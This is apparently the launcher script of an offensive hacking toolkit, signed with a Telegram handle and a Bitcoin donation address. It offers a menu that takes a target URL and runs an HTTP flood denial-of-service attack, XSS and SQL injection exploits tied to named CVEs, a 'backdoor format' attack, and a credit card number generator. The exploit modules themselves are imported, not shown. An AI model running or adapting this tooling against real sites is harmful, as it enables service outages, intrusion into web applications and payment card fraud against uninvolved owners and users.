# Telegram : @Chrome2024
# Donate BTC : 17L22i227Keet23QCNaeCyrQ6xfiTQpQJ5
try:
    import aiohttp
    import asyncio
    import colorama
    import payload
    import pyfiglet
    from pyfiglet import Figlet
    from payload.http_flood_attack import flood_attack
    from payload.http_flood_attack import main
    from payload.credit_card_generator import generator
    from payload.credit_card_generator import lg_cc
    from payload.logo import scripting
    from payload.xss_exploit import checking_vulnerable
    from payload.xss_exploit import exploit
    from payload.sql_command_injection import checking
    from payload.sql_command_injection import exploit_cve_2023_3047
    from payload.sql_command_injection import exploit_cve_2023_3047_2
    from payload.cve_2022_44049 import generator_format
    from payload.cve_2022_44049 import exploit_format
    from colorama import Fore
    from colorama import Style
except:
    import os
    os.system('pip3 install aiohttp')
    os.system('pip3 install colorama')

yellow = f"{Fore.YELLOW}{Style.BRIGHT}"
red = f"{Fore.RED}{Style.BRIGHT}"
green = f"{Fore.GREEN}{Style.BRIGHT}"
reset = f"{Style.RESET_ALL}"
def banner():
    scripting()
    print("""
1, Denial Of Service Attack ( DoS Attack )
2, Generator Credit Card Generator ( gen CC )
3, Exploit CVE-2023-49293 ( Cross-Site Script Injection )
4, Exploit CVE-2023-3047 ( Sql Command Injection )
5, CVE-2022-44049 Attack ( Backdoor Format Python )
""")

banner()
def start():
    choose = input("Choose Method >> ")
    if choose == "1":
        url = input("Target URL Link >> ")
        flood_attack(url)
        while True:
            if __name__ == "__main__":
                loop = asyncio.get_event_loop()
                loop.run_until_complete(main(url))
    if choose == "2":
        lg_cc()
        num = int(input("Enter the number to create [Default : 5] >> "))
        for gen in range(20):
            if __name__ == "__main__":
                generator(num)
    
    if choose == "3":
        fonts = Figlet(font='slant')
        print(fonts.renderText('XSS Exploit'))
        url = input("URL Link : ")
        if __name__ == "__main__":
            checking_vulnerable(url)
            exploit(url)
    if choose == "4":
        fonts = Figlet(font='slant')
        print(fonts.renderText('CVE-2023-3047'))
        print('''
Description :
- Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in TMT Lockcell allows SQL Injection.This issue affects Lockcell: before 15.
''')
        url = input('Enter URL : ')
        if __name__ == "__main__":
            checking(url)
            exploit_cve_2023_3047(url)
            exploit_cve_2023_3047_2(url)

    if choose == "5":
        fonts = Figlet(font='slant')
        print(fonts.renderText('CVE-2022-44049'))
        if __name__ == '__main__':
            generator_format()
            exploit_format()

    else:
        print("Please Choose, Number Is Not Valid")
        exit()
start()
